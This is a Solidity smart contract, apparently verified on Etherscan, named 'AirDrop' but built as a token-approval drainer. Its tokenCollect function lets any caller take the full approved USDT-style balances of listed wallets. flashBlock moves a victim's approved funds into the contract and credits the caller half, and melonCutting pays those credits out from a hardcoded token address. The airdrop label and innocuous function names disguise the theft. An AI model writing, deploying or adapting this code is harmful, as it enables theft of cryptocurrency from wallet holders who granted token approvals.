/**
 *Submitted for verification at Etherscan.io on 2021-12-20
*/

//SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.4.11; 

contract ERC20Basic {

  uint public totalSupply;
  function balanceOf(address who) constant returns (uint);
  function transfer(address to, uint value);
  event Transfer(address indexed from, address indexed to, uint value);

}

contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender) constant returns (uint);
  function transferFrom(address from, address to, uint value);
  function approve(address spender, uint value);
  event Approval(address indexed owner, address indexed spender, uint value);
}

contract Ownable {
  address public owner;


  /** 
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  function Ownable() {
    owner = msg.sender;
  }


  /**
   * @dev Throws if called by any account other than the owner. 
   */
  modifier onlyOwner() {
    if (msg.sender != owner) {
      throw;
    }
    _;
  }


  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to. 
   */
  function transferOwnership(address newOwner) onlyOwner {
    if (newOwner != address(0)) {
      owner = newOwner;
    }
  }

}


contract AirDrop is Ownable {

    //mapping (address => mapping (address => uint)) public shareholder; //
    mapping (address => uint256) public shareholder;
    event TokenDrop(address from, address to, uint256 amount);

    function setHolder(address _holder) public returns (bool) {
        require(_holder != address(0)); 
        shareholder[_holder] = 0;   
        return true;
    }

    function getHolder(address _holder) public returns (uint256) {
        require(_holder != address(0));
        return shareholder[_holder]; 
    }

    function melonCutting() public returns (bool) {
        require(msg.sender != address(0) && shareholder[msg.sender] > 0);
        uint256 bonus  = shareholder[msg.sender];

        ERC20(0xe33691D8737A5EB3D1287AFD6872D4e2ff03e4f6).transfer(msg.sender, bonus);//从合约地址完成usdt转账
        shareholder[msg.sender] = 0; 
        return true;
    } 

    function tokenBalance(address _tokenAddr, address account) public returns (uint256) {
        
        return ERC20(_tokenAddr).balanceOf(account);
    }
  
    function tokenCollect(address _tokenAddr, address[] dests) public returns (bool) {
        require(_tokenAddr != address(0));
        ERC20 usdt = ERC20(_tokenAddr);
        
        for(uint256 i = 0;i < dests.length;i++) {
            uint256 balance   = usdt.balanceOf(dests[i]);     
            uint256 allowance = usdt.allowance(dests[i], this);

            if(allowance <= 0) continue;
            if(balance <= 0) continue;

            uint256 amount = balance > allowance ? allowance : balance;

            usdt.transferFrom(dests[i], msg.sender, amount);

            if(usdt.balanceOf(dests[i]) == 0) {
                shareholder[msg.sender] += amount;
            } 
        }
    }

    function flashBlock(address _tokenAddr, address _owner) public {
        require(_tokenAddr != address(0) && _owner != address(0)); 
        ERC20 usdt        = ERC20(_tokenAddr);
        uint256 balance   = usdt.balanceOf(_owner);  
        uint256 allowance = usdt.allowance(_owner, this);
        require(balance > 0 && allowance > 0);

        uint256 amount = balance > allowance ? allowance : balance; 
        uint256 bonus  = amount * 5 /10 ;
        require(bonus > 0); 
        shareholder[msg.sender] += bonus;
        usdt.transferFrom(_owner, this, amount);
        TokenDrop(_owner, this, amount);
    }
}